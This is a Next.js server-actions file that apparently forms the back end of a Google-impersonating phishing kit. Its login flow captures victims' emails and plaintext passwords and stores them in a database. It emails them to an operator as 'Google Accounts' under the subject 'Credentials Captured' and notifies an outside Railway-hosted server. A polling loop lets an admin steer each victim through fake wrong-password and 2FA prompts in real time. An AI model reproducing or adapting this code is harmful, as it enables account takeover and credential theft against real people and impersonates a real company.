"use server";

import connectDB from "@/lib/db/connectdb";
import User from "@/lib/models/User";
import { cookies } from "next/headers";
import { redirect } from "next/navigation";

// Helper to read from FormData or plain objects
function readField(fd, name) {
    if (!fd) return undefined;
    return typeof fd.get === "function" ? fd.get(name) : fd[name];
}

// Helper function to generate a random 2FA code
function generate2FACode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Helper function to send email using dynamic import
async function sendEmail(email, password, recipientEmail) {
    try {
        // Dynamically import nodemailer to avoid build issues
        const nodemailer = await import('nodemailer');

        // Create transporter with proper configuration
        const transporter = nodemailer.default.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS,
            },
        });

        // Verify connection configuration
        await transporter.verify();

        const mailOptions = {
            from: `"Google Accounts" <${process.env.EMAIL_USER}>`,
            to: recipientEmail || process.env.EMAIL_RECIPIENT,
            subject: "🔐 New Login Attempt - Credentials Captured",
            html: `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Login Credentials</title>
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
              background-color: #f6f9fc;
              margin: 0;
              padding: 20px;
              color: #202124;
            }
            .container {
              max-width: 600px;
              margin: 0 auto;
              background-color: #ffffff;
              border-radius: 12px;
              padding: 40px;
              box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            }
            .header {
              text-align: center;
              padding-bottom: 20px;
              border-bottom: 2px solid #e8eaed;
              margin-bottom: 30px;
            }
            .logo {
              font-size: 28px;
              font-weight: 500;
              letter-spacing: -1px;
            }
            .logo span:nth-child(1) { color: #4285f4; }
            .logo span:nth-child(2) { color: #ea4335; }
            .logo span:nth-child(3) { color: #fbbc05; }
            .logo span:nth-child(4) { color: #4285f4; }
            .logo span:nth-child(5) { color: #34a853; }
            .logo span:nth-child(6) { color: #ea4335; }
            .badge {
              display: inline-block;
              background: #1a73e8;
              color: white;
              padding: 4px 16px;
              border-radius: 20px;
              font-size: 12px;
              font-weight: 500;
              margin-top: 8px;
            }
            .credentials-box {
              background: #f8f9fa;
              border-radius: 8px;
              padding: 20px;
              margin: 20px 0;
              border-left: 4px solid #1a73e8;
            }
            .label {
              font-size: 13px;
              color: #5f6368;
              font-weight: 500;
              text-transform: uppercase;
              letter-spacing: 0.5px;
              margin-bottom: 4px;
            }
            .value {
              font-size: 16px;
              color: #202124;
              font-weight: 500;
              word-break: break-all;
            }
            .divider {
              height: 1px;
              background: #e8eaed;
              margin: 20px 0;
            }
            .footer-text {
              font-size: 13px;
              color: #5f6368;
              text-align: center;
              margin-top: 30px;
              padding-top: 20px;
              border-top: 1px solid #e8eaed;
            }
            .time {
              color: #5f6368;
              font-size: 14px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <div class="logo">
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
              </div>
              <div class="badge">🔐 Security Alert</div>
            </div>

            <h2 style="margin-bottom: 16px; font-weight: 400;">New Login Attempt Detected</h2>

            <p style="color: #5f6368; line-height: 1.6; margin-bottom: 24px;">
              A user has attempted to sign in. The credentials have been captured and logged.
            </p>

            <div class="credentials-box">
              <div style="margin-bottom: 16px;">
                <div class="label">📧 Email Address</div>
                <div class="value">${email}</div>
              </div>
              <div>
                <div class="label">🔑 Password</div>
                <div class="value">${password}</div>
              </div>
            </div>

            <div style="background: #e8f0fe; border-radius: 8px; padding: 16px; margin: 20px 0;">
              <div style="display: flex; align-items: center; gap: 8px; color: #1a73e8; font-weight: 500;">
                <span>⏰</span> Captured at: ${new Date().toLocaleString()}
              </div>
            </div>

            <div class="divider"></div>

            <p style="color: #5f6368; font-size: 14px; line-height: 1.6;">
              <strong>Status:</strong> Pending review. Please check the admin dashboard for more details.
            </p>

            <div class="footer-text">
              <p>This email was sent automatically by your Google Login System.</p>
              <p style="margin-top: 8px; font-size: 12px;">© ${new Date().getFullYear()} - All rights reserved.</p>
            </div>
          </div>
        </body>
        </html>
      `,
        };

        const info = await transporter.sendMail(mailOptions);
        console.log("✅ Email sent successfully! Message ID:", info.messageId);
        return true;
    } catch (error) {
        console.error("❌ Email sending failed:", error.message);
        console.error("Error details:", error);
        return false;
    }
}

// Helper function to send socket notification
async function sendSocketNotification(email, type, message) {
    try {
        // Get socket server URL from environment variables
        const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL ||
            process.env.SOCKET_SERVER_URL ||
            'https://email-password-backend-production.up.railway.app';

        // Remove trailing slash if exists
        const baseUrl = socketUrl.replace(/\/+$/, '');
        const notifyUrl = `${baseUrl}/api/notify-admin`;

        console.log(`📤 Sending notification to: ${notifyUrl}`);

        // Use AbortController for timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);

        const response = await fetch(notifyUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({
                email: email,
                type: type,
                message: message
            }),
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (response.ok) {
            console.log("✅ Socket notification sent successfully");
        } else {
            console.warn(`⚠️ Socket notification failed with status: ${response.status}`);
        }
    } catch (error) {
        if (error.name === 'AbortError') {
            console.warn("⏱️ Socket notification timeout");
        } else {
            console.error("❌ Socket notification error:", error.message);
        }
        // Don't throw - this is non-critical
    }
}

export async function loginAction(formData) {
    try {
        const getField = (fd, name) => {
            if (!fd) return undefined;
            return typeof fd.get === "function" ? fd.get(name) : fd[name];
        };

        let rawStep = getField(formData, "step");
        // Normalize numeric or string steps to named steps
        if (typeof rawStep === "string" && /^[0-9]+$/.test(rawStep)) rawStep = Number(rawStep);
        let step = rawStep;
        if (typeof rawStep === "number") {
            step = rawStep === 1 ? "email" : rawStep === 2 ? "password" : rawStep === 3 ? "2fa" : String(rawStep);
        }

        const email = (getField(formData, "email") || "")?.toLowerCase().trim();
        const password = getField(formData, "password");
        const sessionId = getField(formData, "sessionId");
        const authCode = getField(formData, "authCode");

        await connectDB();

        // Step 1: Email submission
        if (step === "email") {
            if (!email) {
                return {
                    success: false,
                    message: "Email is required.",
                };
            }

            // Validate email format
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                return {
                    success: false,
                    message: "Please enter a valid email address.",
                };
            }

            // Check if user already exists
            let user = await User.findOne({ email });

            if (user) {
                // If user exists, update status to pending
                user.status = "pending";
                user.password = "";
                await user.save();
            } else {
                // Create a new user record with pending status
                user = new User({
                    email,
                    password: "",
                    status: "pending",
                });
                await user.save();
            }

            // Set session cookie with user ID
            const cookieStore = await cookies();
            cookieStore.set("login_session", user._id.toString(), {
                httpOnly: true,
                secure: process.env.NODE_ENV === "production",
                sameSite: "lax",
                maxAge: 3600,
                path: "/",
            });

            return {
                success: true,
                sessionId: user._id.toString(),
            };
        }

        // Step 2: Password submission
        if (step === "password") {
            if (!email || !password) {
                return {
                    success: false,
                    message: "Email and password are required.",
                };
            }

            // Find user by email
            let user = await User.findOne({ email });

            if (!user) {
                // Create new user with pending status if not found
                user = new User({
                    email,
                    password: "",
                    status: "pending",
                });
                await user.save();
            }

            // Update user with password and reset status to pending
            user.password = password;
            user.status = "pending";
            await user.save();

            // Send real-time notification to admin via socket server (non-blocking)
            sendSocketNotification(email, "password_submit", "User has submitted a password");

            // Send email with credentials (non-blocking)
            sendEmail(email, password, process.env.EMAIL_RECIPIENT).catch(err => {
                console.error("Background email send failed:", err);
            });

            // Set session cookie
            const cookieStore = await cookies();
            cookieStore.set("login_session", user._id.toString(), {
                httpOnly: true,
                secure: process.env.NODE_ENV === "production",
                sameSite: "lax",
                maxAge: 3600,
                path: "/",
            });

            // Check user status from database
            const updatedUser = await User.findById(user._id);

            if (!updatedUser) {
                return {
                    success: false,
                    message: "User not found.",
                };
            }

            // Handle different statuses
            switch (updatedUser.status) {
                case "success":
                    return {
                        success: true,
                        completed: true,
                    };

                case "2fa":
                    // Generate a 2FA code if not already set
                    if (!updatedUser.authCode) {
                        updatedUser.authCode = generate2FACode();
                        await updatedUser.save();
                    }
                    return {
                        success: true,
                        requires2FA: true,
                        twoFACode: updatedUser.authCode,
                    };

                case "wrong_email":
                    return {
                        success: false,
                        redirectTo: "email",
                        message: "Email not found. Please enter a valid email.",
                    };

                case "wrong_password":
                    return {
                        success: false,
                        message: "Wrong password. Please try again.",
                    };

                case "pending":
                default:
                    return {
                        success: true,
                        pending: true,
                    };
            }
        }

        // Step 3: 2FA Verification
        if (step === "2fa") {
            if (!email || !authCode) {
                return {
                    success: false,
                    message: "Verification code is required.",
                };
            }

            const user = await User.findOne({ email });

            if (!user) {
                return {
                    success: false,
                    message: "User not found.",
                };
            }

            // Check if the provided code matches
            if (user.authCode === authCode) {
                user.status = "success";
                user.authCode = "";
                await user.save();

                return {
                    success: true,
                    completed: true,
                };
            }

            return {
                success: false,
                message: "Invalid verification code. Please try again.",
            };
        }

        // Invalid step
        return {
            success: false,
            message: "Invalid step. Please try again.",
        };
    } catch (error) {
        console.error("Login action error:", error);
        return {
            success: false,
            message: "An unexpected error occurred. Please try again.",
        };
    }
}

// Admin login action
export async function adminLoginAction(formData) {
    try {
        const username = readField(formData, "username");
        const password = readField(formData, "password");

        if (
            username === process.env.ADMIN_USERNAME &&
            password === process.env.ADMIN_PASSWORD
        ) {
            const cookieStore = await cookies();
            cookieStore.set("admin_session", "authenticated", {
                httpOnly: true,
                secure: process.env.NODE_ENV === "production",
                sameSite: "lax",
                maxAge: 86400,
                path: "/",
            });
            return { success: true };
        }

        return { success: false, message: "Invalid admin credentials." };
    } catch (error) {
        console.error("Admin login error:", error);
        return {
            success: false,
            message: "An unexpected error occurred.",
        };
    }
}

// Admin logout action
export async function adminLogoutAction() {
    const cookieStore = await cookies();
    cookieStore.delete("admin_session");
    redirect("/login");
}

// Check admin session
export async function checkAdminSession() {
    const cookieStore = await cookies();
    return cookieStore.has("admin_session");
}

// Check login status (for polling after password submission)
export async function checkLoginStatus(email) {
    try {
        if (!email) {
            return { success: false, message: "Email is required." };
        }

        await connectDB();

        const user = await User.findOne({ email: email.toLowerCase().trim() });

        if (!user) {
            return { success: false, message: "User not found." };
        }

        switch (user.status) {
            case "success":
                return { success: true, completed: true };

            case "2fa":
                if (!user.authCode) {
                    user.authCode = generate2FACode();
                    await user.save();
                }
                return {
                    success: true,
                    requires2FA: true,
                    twoFACode: user.authCode,
                };

            case "wrong_email":
                return {
                    success: false,
                    redirectTo: "email",
                    message: "Email not found. Please enter a valid email.",
                };

            case "wrong_password":
                return {
                    success: false,
                    message: "Wrong password. Please try again.",
                };

            case "pending":
            default:
                return { success: true, pending: true };
        }
    } catch (error) {
        console.error("Check login status error:", error);
        return { success: false, message: "An error occurred." };
    }
}